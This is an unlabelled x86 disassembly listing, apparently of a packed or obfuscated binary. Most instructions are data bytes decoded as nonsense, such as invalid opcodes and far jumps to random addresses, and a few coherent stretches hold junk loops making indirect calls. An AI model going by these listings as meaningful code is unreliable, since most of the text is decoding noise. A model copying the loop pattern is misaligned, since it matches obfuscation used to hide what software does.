  40a033:	add    BYTE PTR [edx+0x70],bh
  40a036:	or     BYTE PTR [esi-0x1a313ec4],al
  40a03c:	inc    ebp
  40a03d:	pop    ebp
  40a03e:	imul   ecx,DWORD PTR [edi],0x5d
  40a041:	xor    eax,0xd2fafb2c
  40a046:	mov    cl,0x49
  40a048:	mov    ds:0x7a7c84d5,al
  40a04d:	das    
  40a04e:	ins    BYTE PTR es:[edi],dx
  40a04f:	jbe    0x40a028
  40a051:	mov    ecx,0x383c5f50
  40a056:	push   esp
  40a057:	or     ebp,DWORD PTR [ebx+ecx*4]
  40a05a:	sahf   
  40a05b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a05c:	jb     0x409fe4
  40a05e:	shr    ecx,cl
  40a060:	mov    DWORD PTR [eax],edi
  40a062:	iret   
  40a063:	adc    esi,DWORD PTR [eax]
  40a065:	or     DWORD PTR [ecx-0x5f],edi
  40a068:	lahf   
  40a069:	les    ecx,FWORD PTR [eax]
  40a06b:	sbb    eax,0xdd4a6265
  40a070:	fnstcw WORD PTR [eax+ebp*8-0x4]
  40a074:	pushf  
  40a075:	out    0x7b,al
  40a077:	call   0xeddf:0x70da6dba
  40a07e:	cmp    DWORD PTR [ecx],0x7434ca6
  40a084:	test   eax,0x6d270af6
  40a089:	adc    al,0xa9
  40a08b:	dec    edx
  40a08c:	sbb    al,BYTE PTR [ebx]
  40a08e:	mov    ebx,0x7f96a49c
  40a093:	pushf  
  40a094:	inc    ecx
  40a095:	inc    ecx
  40a096:	or     dh,BYTE PTR [ebx-0x6a]
  40a099:	(bad)  
  40a09a:	sub    al,0x7e
  40a09c:	sub    DWORD PTR [ecx],eax
  40a09e:	ds dec edx
  40a0a0:	sub    DWORD PTR [edi],esi
  40a0a2:	cwde   
  40a0a3:	xor    dh,al
  40a0a5:	xor    DWORD PTR [edx+esi*1+0x156981e3],ebx
  40a0ac:	shr    ch,1
  40a0ae:	dec    edx
  40a0af:	and    eax,ebx
  40a0b1:	adc    bh,BYTE PTR [edi-0x37]
  40a0b4:	les    eax,FWORD PTR [esi-0x1bac53e3]
  40a0ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0bb:	dec    BYTE PTR [eax]
  40a0bd:	mov    eax,ds:0x10002d91
  40a0c2:	in     al,0x4d
  40a0c4:	fstp   TBYTE PTR [edi+0x35]
  40a0c7:	jbe    0x40a0ad
  40a0c9:	rol    DWORD PTR [eax-0x143c0037],0x3b
  40a0d0:	jmp    0xa2a:0x87a6c210
  40a0d7:	shr    DWORD PTR ds:0xffae867,1
  40a0dd:	cmp    ebp,esi
  40a0df:	fmul   DWORD PTR [esi+0x36248d12]
  40a0e5:	sub    bl,BYTE PTR [edi+eax*4+0x75974d4a]
  40a0ec:	iret   
  40a0ed:	lea    ebp,[edx+0x5154b3a5]
  40a0f3:	int3   
  40a0f4:	mov    ebp,0xff0a313b
  40a0f9:	stos   DWORD PTR es:[edi],eax
  40a0fa:	gs sbb al,0xc8
  40a0fd:	sbb    DWORD PTR [edi+0x4c557ad1],esi
  40a103:	stc    
  40a104:	popf   
  40a105:	fwait
  40a106:	inc    ebx
  40a107:	xchg   edi,eax
  40a108:	jns    0x40a143
  40a10a:	in     al,0xd8
  40a10c:	sbb    edi,DWORD PTR [ebp+esi*8+0x187f2adf]
  40a113:	lods   al,BYTE PTR ds:[esi]
  40a114:	push   es
  40a115:	xor    BYTE PTR [ebp+0x3feab46a],ah
  40a11b:	ror    DWORD PTR [edx-0x2cda48fa],cl
  40a121:	xor    dh,BYTE PTR [ebx+0x39f7c357]
  40a127:	enter  0x65eb,0xca
  40a12b:	jg     0x40a11c
  40a12d:	jae    0x40a19a
  40a12f:	sbb    ebp,esi
  40a131:	lds    esi,FWORD PTR [bx+di]
  40a134:	jge    0x40a17d
  40a136:	mov    al,0x9d
  40a138:	fs xor ecx,esi
  40a13b:	jp     0x40a19f
  40a13d:	test   BYTE PTR [esi-0x2c],bh
  40a140:	cmp    bl,cl
  40a142:	push   esi
  40a143:	mov    edi,0xc19f695d
  40a148:	or     eax,0xebfe361e
  40a14d:	imul   esp,DWORD PTR [edx+0x1561bc53],0x42dc0109
  40a157:	outs   dx,DWORD PTR ds:[esi]
  40a158:	mov    dh,0x14
  40a15a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a15b:	loop   0x40a15c
  40a15d:	cmp    eax,0x6e991cd5
  40a162:	adc    BYTE PTR [edx],ch
  40a164:	in     al,0xfb
  40a166:	cli    
  40a167:	add    dh,ah
  40a169:	sbb    al,0x7f
  40a16b:	ret    0x3df
  40a16e:	pushf  
  40a16f:	mov    ds:0x5a3fdf79,eax
  40a174:	xchg   ebx,eax
  40a175:	mov    BYTE PTR [esi],ah
  40a177:	adc    dh,bl
  40a179:	icebp  
  40a17a:	xlat   BYTE PTR ds:[ebx]
  40a17b:	inc    edx
  40a17c:	(bad)  [ebx+0x11]
  40a17f:	mov    al,ss:0x8b706981
  40a185:	push   eax
  40a186:	pusha  
  40a187:	mov    ?,WORD PTR [edx+eiz*1]
  40a18a:	push   eax
  40a18b:	mov    edi,0x1e3b35e4
  40a190:	jno    0x40a130
  40a192:	stos   DWORD PTR es:[edi],eax
  40a193:	adc    ch,BYTE PTR [ebx-0x4a5fcd63]
  40a199:	xchg   ecx,eax
  40a19a:	xchg   edi,eax
  40a19b:	test   eax,0xf0d54b05
  40a1a0:	and    bl,bh
  40a1a2:	pop    ebx
  40a1a3:	mov    esp,0xd0c69e9b
  40a1a8:	pop    ebp
  40a1a9:	push   ds
  40a1aa:	rsm    
  40a1ac:	mov    dl,0x79
  40a1ae:	in     al,dx
  40a1af:	pop    ds
  40a1b0:	in     al,dx
  40a1b1:	aad    0x68
  40a1b3:	xor    eax,0xf3bbd020
  40a1b8:	dec    edi
  40a1b9:	xlat   BYTE PTR ds:[ebx]
  40a1ba:	or     DWORD PTR [edi],eax
  40a1bc:	(bad)  
  40a1bd:	mov    ds:0x79a9b98b,al
  40a1c2:	mov    esp,0xee885472
  40a1c7:	pop    esi
  40a1c8:	int3   
  40a1c9:	int    0x94
  40a1cb:	fstp   TBYTE PTR [eax+0x1c]
  40a1ce:	sbb    ebp,DWORD PTR [ebx-0x6e509f0]
  40a1d4:	mul    esi
  40a1d6:	stc    
  40a1d7:	or     eax,0x5ebb9858
  40a1dc:	repz push esp
  40a1de:	cmp    al,BYTE PTR [eax]
  40a1e0:	lock xor al,0x73
  40a1e3:	push   ss
  40a1e4:	mov    bh,0x86
  40a1e6:	lahf   
  40a1e7:	sbb    esp,DWORD PTR [edx-0x60]
  40a1ea:	push   esp
  40a1eb:	repnz (bad) 
  40a1ed:	out    dx,eax
  40a1ee:	repz loope 0x40a252
  40a1f1:	(bad)  
  40a1f2:	shl    BYTE PTR [ebx],cl
  40a1f4:	or     ebp,DWORD PTR [ebp-0x8]
  40a1f7:	sub    eax,esi
  40a1f9:	fcomp  DWORD PTR [eax+0xab857c9]
  40a1ff:	test   al,0xdd
  40a201:	fdivp  st(5),st
  40a203:	stos   BYTE PTR es:[edi],al
  40a204:	xor    eax,0x96862820
  40a209:	fcmovnbe st,st(4)
  40a20b:	sub    edx,DWORD PTR [edi]
  40a20d:	mov    ds:0x1ee48596,al
  40a212:	mov    cl,0x4
  40a214:	sar    DWORD PTR [edi-0x6ccdcb61],cl
  40a21a:	ret    0xe764
  40a21d:	xchg   esi,ebx
  40a21f:	(bad)  [edx+0x75374f6d]
  40a225:	mov    eax,ds:0xbc73dfd8
  40a22a:	ror    BYTE PTR [edx+0x45c747ff],1
  40a230:	cld    
  40a231:	rol    DWORD PTR [ebp+0x45c7f89c],1
  40a237:	fdiv   DWORD PTR [ebx]
  40a239:	test   DWORD PTR [eax+edi*8+0x45c7d213],ebx
  40a240:	aam    0x32
  40a242:	test   DWORD PTR [eax+edi*8-0x312da7f],ebx
  40a249:	inc    edx
  40a24a:	add    BYTE PTR [eax],al
  40a24c:	add    BYTE PTR [eax],al
  40a24e:	add    cl,ch
  40a250:	sldt   WORD PTR [eax]
  40a253:	add    BYTE PTR [ebx],dh
  40a255:	ror    BYTE PTR [ebx],cl
  40a257:	adc    eax,0x42fced
  40a25c:	inc    edx
  40a25d:	mov    DWORD PTR ds:0x42fced,edx
  40a263:	cmp    DWORD PTR ds:0x42fced,0x10
  40a26a:	jae    0x40a2a2
  40a270:	cmp    DWORD PTR ds:0x42fced,0x14
  40a277:	jne    0x40a297
  40a27d:	push   0x83c5
  40a282:	push   0x5a78
  40a287:	push   0x49ef
  40a28c:	push   0x22e4
  40a291:	call   DWORD PTR ds:0x42e2e7
  40a297:	jmp    0x40a254
  40a29c:	add    DWORD PTR ds:0x42e128,edx
  40a2a2:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  40a2a9:	and    DWORD PTR ds:0x42e70f,0x7d59
  40a2b3:	jmp    0x40a671
  40a2b8:	into   
  40a2b9:	iret   
  40a2ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2bb:	cmp    esp,DWORD PTR [ebp+0x7cc97171]
  40a2c1:	sbb    bl,BYTE PTR [edi+0x2b]
  40a2c4:	cmc    
  40a2c5:	and    eax,0xf545f3f5
  40a2ca:	jo     0x40a33c
  40a2cc:	lahf   
  40a2cd:	jge    0x40a33f
  40a2cf:	jo     0x40a278
  40a2d1:	shl    dh,1
  40a2d3:	push   ebp
  40a2d4:	das    
  40a2d5:	add    al,0x85
  40a2d7:	neg    dl
  40a2d9:	mov    edi,0x2f5a2ab8
  40a2de:	xor    edi,esi
  40a2e0:	dec    bl
  40a2e2:	adc    bh,BYTE PTR [eax]
  40a2e4:	shl    BYTE PTR [eax-0x2221b834],1
  40a2ea:	imul   ebp,DWORD PTR [edx],0xe0d0d3b
  40a2f0:	dec    edi
  40a2f1:	jmp    0xb0a5:0xc06a6e15
  40a2f8:	fld    QWORD PTR [edx+esi*1-0x13de94b4]
  40a2ff:	pop    esp
  40a300:	lea    edi,[edi]
  40a302:	mov    bl,0xfe
  40a304:	add    dh,0x69
  40a307:	fs pusha 
  40a309:	das    
  40a30a:	sbb    bh,BYTE PTR [ebx]
  40a30c:	pop    ecx
  40a30d:	inc    ecx
  40a30e:	fisub  DWORD PTR ds:0x91188cf4
  40a314:	inc    ecx
  40a315:	aaa    
  40a316:	and    eax,0xb6fc226b
  40a31b:	fldcw  WORD PTR [edx-0x62]
  40a31e:	icebp  
  40a31f:	test   DWORD PTR [edx],0x3c83db76
  40a325:	lods   eax,DWORD PTR ds:[esi]
  40a326:	jle    0x40a327
  40a328:	aas    
  40a329:	push   esi
  40a32a:	lock mov ds:0x8869b310,eax
  40a330:	pop    ecx
  40a331:	das    
  40a332:	adc    eax,0xa652e1ce
  40a337:	xor    ecx,esi
  40a339:	sti    
  40a33a:	cmp    BYTE PTR [edi-0x31],dh
  40a33d:	xchg   esi,eax
  40a33e:	in     eax,0x3f
  40a340:	adc    BYTE PTR [esi],ch
  40a342:	and    BYTE PTR [edx],dl
  40a344:	xor    al,0x67
  40a346:	mov    WORD PTR [edx-0x21],gs
  40a349:	je     0x40a333
  40a34b:	int3   
  40a34c:	test   BYTE PTR [ebx],al
  40a34e:	nop
  40a34f:	fs jns 0x40a335
  40a352:	aaa    
  40a353:	push   0x5a31cece
  40a358:	js     0x40a326
  40a35a:	adc    al,0x2e
  40a35c:	imul   BYTE PTR [ebp-0x1deed89e]
  40a362:	inc    edi
  40a363:	jp     0x40a306
  40a365:	rol    bl,0x8c
  40a368:	aam    0x3f
  40a36a:	es leave 
  40a36c:	dec    ebp
  40a36d:	hlt    
  40a36e:	pop    ecx
  40a36f:	xchg   BYTE PTR [eax-0x6b12e0af],ah
  40a375:	add    BYTE PTR [edi+0x5bdd0e9c],dl
  40a37b:	cmc    
  40a37c:	push   esp
  40a37d:	jle    0x40a37e
  40a37f:	jno    0x40a3c7
  40a381:	ror    BYTE PTR cs:[eax+0x68a3776c],cl
  40a388:	repnz imul ebx,DWORD PTR [ebx-0x15cdecb3],0xffffffa4
  40a390:	and    ch,ah
  40a392:	cmp    eax,0xf7d446b8
  40a397:	fs jne 0x40a3c0
  40a39a:	xlat   BYTE PTR ds:[ebx]
  40a39b:	lds    ebx,FWORD PTR [edx+0x4b]
  40a39e:	lds    ebp,FWORD PTR [ecx+esi*1]
  40a3a1:	fadd   DWORD PTR [esp+ebp*1-0x1f78eb28]
  40a3a8:	addr16 mov ah,0x6b
  40a3ab:	stos   DWORD PTR es:[edi],eax
  40a3ac:	sti    
  40a3ad:	mov    dh,0xde
  40a3b0:	and    eax,0xf336262b
  40a3b5:	mov    al,ds:0x775a5ea6
  40a3ba:	inc    ebp
  40a3bb:	jmp    0x67b4:0xefd0ae3e
  40a3c2:	mov    ebp,0x27ea8292
  40a3c7:	test   cl,dh
  40a3c9:	jmp    0xc2bf4fc9
  40a3ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3cf:	or     al,0x28
  40a3d1:	arpl   WORD PTR [ecx+0x2e4bb63b],bx
  40a3d7:	mov    al,0x49
  40a3d9:	adc    ecx,edx
  40a3db:	pop    eax
  40a3dc:	pop    ebx
  40a3dd:	les    ecx,FWORD PTR [eax+0x39a1df7d]
  40a3e3:	dec    eax
  40a3e4:	sbb    BYTE PTR [edi-0x6a],cl
  40a3e7:	loopne 0x40a3d3
  40a3e9:	adc    BYTE PTR ds:0x2eb411a4,0xb0
  40a3f0:	(bad)  
  40a3f1:	pop    esi
  40a3f2:	xchg   ebp,eax
  40a3f3:	sbb    edi,esi
  40a3f5:	lock adc BYTE PTR [ecx],ch
  40a3f8:	aam    0xd6
  40a3fa:	sbb    bh,BYTE PTR ds:0x1f398008
  40a400:	xor    DWORD PTR [ebp-0x27478324],edi
  40a406:	adc    DWORD PTR [edi+0x2],0xda1cfd22
  40a40d:	dec    edi
  40a40e:	in     al,dx
  40a40f:	fisubr WORD PTR [esi-0x49]
  40a412:	iret   
  40a413:	iret   
  40a414:	call   0x83:0xc0bb0843
  40a41b:	mov    cl,0x92
  40a41d:	jmp    0x40a3d4
  40a41f:	xor    esi,DWORD PTR [ebp+eiz*4+0x60231b07]
  40a426:	fs cdq 
  40a428:	loope  0x40a451
  40a42a:	push   ebx
  40a42b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a42c:	stos   DWORD PTR es:[edi],eax
  40a42d:	enter  0x3060,0x7e
  40a431:	cli    
  40a432:	shl    BYTE PTR [edx],1
  40a434:	inc    DWORD PTR [edi-0x563471a9]
  40a43a:	popf   
  40a43b:	pop    ss
  40a43c:	retf   
  40a43d:	or     eax,0x270dd3bf
  40a442:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a443:	xor    BYTE PTR [ebx+0x7b44ead9],ch
  40a449:	inc    esi
  40a44a:	pusha  
  40a44b:	fcomp  DWORD PTR es:[eax]
  40a44e:	shr    DWORD PTR ds:0x38628395,1
  40a454:	mov    cl,0x5e
  40a456:	lds    esp,FWORD PTR [edx+eiz*2-0x2d67167e]
  40a45d:	jge    0x40a3f2
  40a45f:	jge    0x40a406
  40a461:	inc    ecx
  40a462:	adc    al,0xc2
  40a464:	aad    0x5d
  40a466:	repz fwait
  40a468:	and    eax,0x723f9f80
  40a46d:	retf   0x31b9
  40a470:	popf   
  40a471:	cld    
  40a472:	sti    
  40a473:	push   esp
  40a474:	test   eax,0x4469ea95
  40a479:	les    ecx,FWORD PTR [edi-0x3a]
  40a47c:	push   ecx
  40a47d:	xor    al,0x88
  40a47f:	in     al,0xc4
  40a481:	call   0xdc1a1187
  40a486:	inc    ebx
  40a487:	std    
  40a488:	jl     0x40a4f6
  40a48a:	repnz adc eax,0x19383d08
  40a490:	lock mov al,ah
  40a493:	jns    0x40a4c3
  40a495:	sub    DWORD PTR [ebp-0x62],eax
  40a498:	jle    0x40a42a
  40a49a:	jb     0x40a425
  40a49c:	loopne 0x40a445
  40a49e:	sub    al,0xe6
  40a4a0:	inc    ebp
  40a4a1:	sahf   
  40a4a2:	xor    eax,0x32ffc2b6
  40a4a7:	or     DWORD PTR [edi+0x70],edi
  40a4aa:	sbb    al,0x20
  40a4ac:	or     ebp,ecx
  40a4ae:	or     al,0x11
  40a4b0:	xor    al,0x65
  40a4b2:	pop    ebx
  40a4b3:	js     0x40a4a2
  40a4b5:	loope  0x40a4df
  40a4b7:	addr16 or esp,esp
  40a4ba:	sbb    DWORD PTR [edi],edi
  40a4bc:	fsubr  DWORD PTR [eax]
  40a4be:	xor    al,0x25
  40a4c0:	push   eax
  40a4c1:	stos   DWORD PTR es:[edi],eax
  40a4c2:	frndint 
  40a4c4:	out    0xc6,al
  40a4c6:	jnp    0x40a44e
  40a4c8:	aam    0x28
  40a4ca:	ss mov ebp,0xf1ce002e
  40a4d0:	sbb    BYTE PTR [ebp-0x11],bh
  40a4d3:	mov    dh,0xd6
  40a4d5:	jns    0x40a4f6
  40a4d7:	sti    
  40a4d8:	xor    eax,0x435a8e90
  40a4dd:	xchg   ebp,eax
  40a4de:	mov    ds:0x38e408af,al
  40a4e3:	pusha  
  40a4e4:	cmp    dl,BYTE PTR [edi]
  40a4e6:	push   ebp
  40a4e7:	and    al,0xc0
  40a4e9:	out    dx,al
  40a4ea:	neg    BYTE PTR [eax+0x4af74660]
  40a4f0:	(bad)  
  40a4f2:	int3   
  40a4f3:	mov    cl,BYTE PTR [ebx+eiz*8]
  40a4f6:	inc    ecx
  40a4f7:	pop    esp
  40a4f8:	push   0xffffffbb
  40a4fa:	test   DWORD PTR [ebx-0x1d],0x60a44402
  40a501:	dec    edi
  40a502:	lea    ecx,[esp+edi*1-0x55cd0343]
  40a509:	inc    esi
  40a50a:	popf   
  40a50b:	or     al,0x4a
  40a50d:	mov    edi,0x1f10ab4d
  40a512:	push   0x6e
  40a514:	(bad)  
  40a515:	lods   al,BYTE PTR ds:[esi]
  40a516:	sbb    dl,BYTE PTR [eax+0x2c]
  40a519:	lea    edx,[eax]
  40a51b:	fistp  QWORD PTR [ecx]
  40a51d:	cdq    
  40a51e:	mov    edi,DWORD PTR [ecx-0x3145ef75]
  40a524:	or     eax,0xc4322fb5
  40a529:	aaa    
  40a52a:	fucomp st(0)
  40a52c:	pop    ss
  40a52d:	dec    esp
  40a52e:	shl    DWORD PTR [edx-0x17d61c04],0x2f
  40a535:	enter  0x11a,0xc
  40a539:	mov    al,dl
  40a53b:	or     eax,0x64b469ac
  40a540:	sbb    eax,0x971a6bea
  40a545:	or     BYTE PTR [eax],ch
  40a547:	add    ebx,ecx
  40a549:	jp     0x40a5ba
  40a54b:	dec    ebx
  40a54c:	xchg   edx,eax
  40a54d:	mov    ds:0x60ccf7a9,al
  40a552:	inc    esi
  40a553:	jle    0x40a548
  40a555:	or     ebp,DWORD PTR [esi+0x5a]
  40a558:	jbe    0x40a5ab
  40a55a:	test   BYTE PTR [edx+0x77ab56df],ah
  40a560:	repz inc edx
  40a562:	sbb    al,0x7
  40a564:	stc    
  40a565:	std    
  40a566:	retf   
  40a567:	xor    DWORD PTR [edi+0x44],esp
  40a56a:	and    al,0xf9
  40a56c:	mov    dl,0x69
  40a56e:	lock dec eax
  40a570:	and    ebx,DWORD PTR [esi+0x4c]
  40a573:	jmp    0x40a56f
  40a575:	fsubrp st(7),st
  40a577:	ret    
  40a578:	add    al,BYTE PTR [edi]
  40a57a:	cdq    
  40a57b:	sbb    eax,0x2cb172ad
  40a580:	lds    edx,FWORD PTR [esi+0x2667396a]
  40a586:	outs   dx,DWORD PTR ds:[esi]
  40a587:	je     0x40a593
  40a589:	or     DWORD PTR [esi],ebp
  40a58b:	mov    bl,0xb6
  40a58d:	loope  0x40a5d2
  40a58f:	sbb    esi,edx
  40a591:	enter  0xd7f0,0x95
  40a595:	jecxz  0x40a5ef
  40a597:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a598:	ret    
  40a599:	arpl   WORD PTR [eax-0x3cb38e63],dx
  40a59f:	rcr    DWORD PTR ds:0xd15126db,0x9
  40a5a6:	or     dl,ah
  40a5a8:	leave  
  40a5a9:	dec    ecx
  40a5aa:	jmp    0x40a566
  40a5ac:	push   es
  40a5ad:	push   es
  40a5ae:	scas   eax,DWORD PTR es:[edi]
  40a5af:	and    DWORD PTR [ecx+0x2377bd6c],esi
  40a5b5:	out    dx,al
  40a5b6:	and    eax,0x3765044d
  40a5bb:	test   cl,cl
  40a5bd:	sbb    al,0x88
  40a5bf:	xor    eax,0x2c61e20c
  40a5c4:	mov    ecx,DWORD PTR [eax]
  40a5c6:	ds ds out dx,eax
  40a5c9:	int3   
  40a5ca:	ja     0x40a639
  40a5cc:	push   0x31
  40a5ce:	into   
  40a5cf:	loop   0x40a5fb
  40a5d1:	pop    edi
  40a5d2:	xchg   ecx,eax
  40a5d3:	jge    0x40a633
  40a5d5:	push   edx
  40a5d6:	sti    
  40a5d7:	out    0x80,al
  40a5d9:	pop    edi
  40a5da:	test   al,0x69
  40a5dc:	lods   al,BYTE PTR ds:[esi]
  40a5dd:	push   0xb5c9cf0d
  40a5e2:	stos   BYTE PTR es:[edi],al
  40a5e3:	cmc    
  40a5e4:	dec    edi
  40a5e5:	aam    0xf6
  40a5e7:	adc    al,0xfd
  40a5e9:	jbe    0x40a659
  40a5eb:	loop   0x40a601
  40a5ed:	push   edi
  40a5ee:	dec    ebx
  40a5ef:	xor    DWORD PTR ds:0xa1e2d768,esp
  40a5f5:	(bad)  
  40a5f6:	dec    eax
  40a5f7:	mov    esi,0x3e9a6669
  40a5fc:	retf   0x9ca1
  40a5ff:	(bad)  
  40a600:	call   0xe5f185fc
  40a605:	out    0x44,al
  40a607:	jmp    0xa4b0:0x76206ab9
  40a60e:	add    eax,0xd1f30970
  40a613:	sub    bl,BYTE PTR [ebx+0x71f6576d]
  40a619:	push   eax
  40a61a:	dec    esp
  40a61b:	jge    0x40a5c8
  40a61d:	sub    edi,esp
  40a61f:	sub    eax,0xe36e0f45
  40a624:	shl    ch,1
  40a626:	add    ebx,ebx
  40a628:	lods   al,BYTE PTR ds:[esi]
  40a629:	leavew 
  40a62b:	ja     0x40a69c
  40a62d:	cmp    al,0x67
  40a62f:	xchg   ebx,eax
  40a630:	nop
  40a631:	std    
  40a632:	aaa    
  40a633:	push   edi
  40a634:	std    
  40a635:	lods   eax,DWORD PTR ds:[esi]
  40a636:	pop    es
  40a637:	inc    ebx
  40a638:	xchg   edx,eax
  40a639:	adc    DWORD PTR [edx+0x5ae94d80],edi
  40a63f:	jo     0x40a6a1
  40a641:	iret   
  40a642:	sbb    eax,0xfe820b5e
  40a647:	xor    ecx,DWORD PTR [ecx-0x19]
  40a64a:	je     0x40a677
  40a64c:	jmp    FWORD PTR [eax+ebp*4-0x6438c80c]
  40a653:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a654:	or     ebx,esp
  40a656:	loop   0x40a637
  40a658:	in     eax,dx
  40a659:	pop    edx
  40a65a:	xchg   esp,eax
  40a65b:	pop    ds
  40a65c:	sbb    BYTE PTR ds:0x532cee53,ch
  40a662:	mov    ch,0x96
  40a664:	sti    
  40a665:	scas   al,BYTE PTR es:[edi]
  40a666:	add    al,0x8b
  40a668:	mov    ebx,0x9433180f
  40a66d:	xor    DWORD PTR [edx],eax
  40a66f:	and    ecx,edi
  40a671:	mov    DWORD PTR [ebp-0x34],0xf89c853c
  40a678:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40a67f:	and    DWORD PTR ds:0x42e6ef,0x0
  40a689:	xor    edx,edx
  40a68b:	or     edx,DWORD PTR ds:0x42e6ef
  40a691:	inc    edx
  40a692:	mov    DWORD PTR ds:0x42e6ef,edx
  40a698:	cmp    DWORD PTR ds:0x42e6ef,0xf
  40a69f:	jne    0x40a6c6
  40a6a5:	push   DWORD PTR [ebp-0x28]
  40a6a8:	push   DWORD PTR [ebp-0x10]
  40a6ab:	push   0x42e6f7
  40a6b0:	push   DWORD PTR [ebp-0x14]
  40a6b3:	push   DWORD PTR [ebp-0x18]
  40a6b6:	push   0x89bc
  40a6bb:	push   0x39f6
  40a6c0:	call   DWORD PTR ds:0x42e2eb
  40a6c6:	cmp    DWORD PTR ds:0x42e6ef,0xe
  40a6cd:	jne    0x40a6e0
  40a6d3:	mov    edx,DWORD PTR ds:0x42e6ef
  40a6d9:	inc    edx
  40a6da:	mov    DWORD PTR ds:0x42e6ef,edx
  40a6e0:	cmp    DWORD PTR ds:0x42e6ef,0x1c
  40a6e7:	jb     0x40a689
  40a6ed:	and    DWORD PTR ds:0x42fcdd,0x0
  40a6f7:	jmp    0x40a709
  40a6fc:	mov    edx,DWORD PTR ds:0x42fcdd
  40a702:	inc    edx
  40a703:	mov    DWORD PTR ds:0x42fcdd,edx
  40a709:	cmp    DWORD PTR ds:0x42fcdd,0x13
  40a710:	jae    0x40a766
  40a716:	cmp    DWORD PTR ds:0x42fcdd,0xb
  40a71d:	jne    0x40a733
  40a723:	push   0x42e26d
  40a728:	push   0x42e25b
  40a72d:	call   DWORD PTR ds:0x42e547
  40a733:	cmp    DWORD PTR ds:0x42fcdd,0xa
  40a73a:	jne    0x40a74f
  40a740:	xor    edx,edx
  40a742:	add    edx,DWORD PTR ds:0x42fcdd
  40a748:	inc    edx
  40a749:	mov    DWORD PTR ds:0x42fcdd,edx
  40a74f:	jmp    0x40a6fc
  40a754:	mov    edi,DWORD PTR ds:0x42e134
  40a75a:	xor    edi,DWORD PTR ds:0x42e713
  40a760:	mov    DWORD PTR ds:0x42e134,edi
  40a766:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  40a76d:	adc    DWORD PTR ds:0x42e713,edx
  40a773:	mov    edx,DWORD PTR [ebp+0x8]
  40a776:	xor    edx,eax
  40a778:	sub    edi,DWORD PTR ds:0x42fcd1
  40a77e:	mov    edi,DWORD PTR [ebp-0x10]
  40a781:	add    edx,ecx
  40a783:	mov    DWORD PTR ds:0x42fce5,0x29c7
  40a78d:	cmp    edi,edx
  40a78f:	mov    DWORD PTR ds:0x42e713,0x10c5
  40a799:	je     0x40d88b
  40a79f:	mov    DWORD PTR ds:0x42fcf9,0x41c2
  40a7a9:	push   ebx
  40a7aa:	mov    DWORD PTR ds:0x42fd09,0x2602
  40a7b4:	jmp    0x40d4a8
  40a7b9:	mov    edx,DWORD PTR [ebp-0x8]
  40a7bc:	mov    DWORD PTR ds:0x42e130,0x1c
  40a7c6:	cmp    DWORD PTR ds:0x42e130,0x0
  40a7cd:	je     0x40a824
  40a7d3:	cmp    DWORD PTR ds:0x42e130,0x7
  40a7da:	jne    0x40a7f8
  40a7e0:	push   DWORD PTR [ebp-0x10]
  40a7e3:	push   0x42e1e7
  40a7e8:	push   0x42e23d
  40a7ed:	push   0x42e23d
  40a7f2:	call   DWORD PTR ds:0x42e2ef
  40a7f8:	cmp    DWORD PTR ds:0x42e130,0x8
  40a7ff:	jne    0x40a812
  40a805:	mov    edi,DWORD PTR ds:0x42e130
  40a80b:	dec    edi
  40a80c:	mov    DWORD PTR ds:0x42e130,edi
  40a812:	mov    edi,DWORD PTR ds:0x42e130
  40a818:	dec    edi
  40a819:	mov    DWORD PTR ds:0x42e130,edi
  40a81f:	jmp    0x40a7c6
  40a824:	mov    edi,DWORD PTR [ebp-0x10]
  40a827:	xor    DWORD PTR ds:0x42e12c,0x3333
  40a831:	sub    edi,edx
  40a833:	mov    edx,DWORD PTR ds:0x42fd6e
  40a839:	add    DWORD PTR ds:0x42e707,edx
  40a83f:	mov    edx,DWORD PTR [ebp-0x4]
  40a842:	jmp    0x40ac00
  40a847:	addr16 sub al,0x5e
  40a84a:	xchg   esi,eax
  40a84b:	jno    0x40a89f
  40a84d:	ja     0x40a838
  40a84f:	dec    eax
  40a850:	(bad)  
  40a851:	in     al,dx
  40a852:	std    
  40a853:	mov    esi,0xe4ba2955
  40a858:	icebp  
  40a859:	jo     0x40a8cb
  40a85b:	lahf   
  40a85c:	jge    0x40a8ce
  40a85e:	jo     0x40a8b4
  40a860:	mov    edi,0xdfcf7c20
  40a865:	mov    esp,0x96fe0199
  40a86a:	int    0xfd
  40a86c:	in     al,0x4
  40a86e:	cmp    eax,0xb769a160
  40a873:	loop   0x40a88a
  40a875:	jp     0x40a85b
  40a877:	ds pushf 
  40a879:	pusha  
  40a87a:	sbb    al,BYTE PTR [ecx]
  40a87c:	adc    BYTE PTR [esi+0x2],0x10
  40a880:	clc    
  40a881:	outs   dx,BYTE PTR ds:[esi]
  40a882:	mov    DWORD PTR [edi+edx*8+0x29],esp
  40a886:	bound  ebx,QWORD PTR [ebp-0x76]
  40a889:	jnp    0x40a8c5
  40a88b:	pop    edi
  40a88c:	and    BYTE PTR [eax+0x53],al
  40a88f:	adc    al,0x72
  40a891:	jge    0x40a82b
  40a893:	neg    BYTE PTR [ebx]
  40a895:	push   ebx
  40a896:	add    al,0xe
  40a898:	cmp    esp,DWORD PTR [edx+ecx*8]
  40a89b:	jecxz  0x40a872
  40a89d:	push   eax
  40a89e:	inc    ecx
  40a89f:	sbb    DWORD PTR ds:0x9901e454,0xffffffb7
  40a8a6:	cmp    al,0x66
  40a8a8:	pusha  
  40a8a9:	pop    esp
  40a8aa:	(bad)  
  40a8ab:	popf   
  40a8ac:	inc    ebp
  40a8ad:	add    bl,BYTE PTR [ecx-0x6ad145f4]
  40a8b3:	sahf   
  40a8b4:	sub    al,0xf9
  40a8b6:	and    al,al
  40a8b8:	xchg   ebx,eax
  40a8b9:	add    al,0xa4
  40a8bb:	pushf  
  40a8bc:	sub    BYTE PTR [ecx-0x1c],dl
  40a8bf:	test   eax,0x871f274a
  40a8c4:	outs   dx,DWORD PTR ds:[esi]
  40a8c5:	jg     0x40a86b
